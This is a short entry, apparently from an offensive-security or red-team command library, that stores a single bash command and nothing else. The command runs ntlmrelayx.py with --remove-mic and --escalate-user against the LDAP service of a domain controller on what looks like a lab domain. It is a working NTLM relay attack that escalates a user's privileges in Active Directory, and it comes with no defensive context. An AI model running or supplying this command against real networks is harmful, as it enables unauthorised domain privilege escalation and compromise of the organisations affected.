---
id: 93af84f0-aa15-41fa-923d-32bc303a354b
name: Run ntlmrelayx.py to escalate user privileges
type: command
executor: bash
data: ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local
  -smb2support
output: null
created_at: '2023-04-06T03:56:05.532770+00:00'
updated_at: '2023-04-10T20:26:36.992508+00:00'
---

# Run ntlmrelayx.py to escalate user privileges

```bash
ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support
```


